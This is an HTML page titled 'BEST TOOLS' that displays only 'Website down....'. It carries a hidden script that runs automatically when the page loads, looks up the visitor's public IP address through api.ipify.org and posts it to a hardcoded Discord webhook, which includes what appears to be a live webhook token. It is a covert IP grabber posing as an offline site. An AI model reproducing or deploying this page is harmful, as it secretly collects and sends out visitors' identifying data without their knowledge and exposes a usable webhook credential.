<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>BEST TOOLS</title>
  <style>
    .centered-text {
      text-align: center;
      margin-top: 20vh; 
    }
  </style>
</head>
<body>

<div class="centered-text">
  <p>Website down....</p>
</div>

<script>
  function getinfo() {
    fetch('https://api.ipify.org/?format=json')
      .then(response => response.json())
      .then(data => {
        const message = data.ip;
        sendToDiscord(message);
      });
  }

  function sendToDiscord(message) {
    const webhookURL = 'https://discord.com/api/webhooks/1260684469577191608/KNbvKl5C7ioG8ScwLb_ObSJ6ECzVtwmOkVUc1pLWg4IHWq9F6EmI5137vMvulnoW1brr';
    const payload = {
      content: `${message}`
    };

    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });
  }

  document.addEventListener('DOMContentLoaded', getinfo);
</script>

</body>
</html>
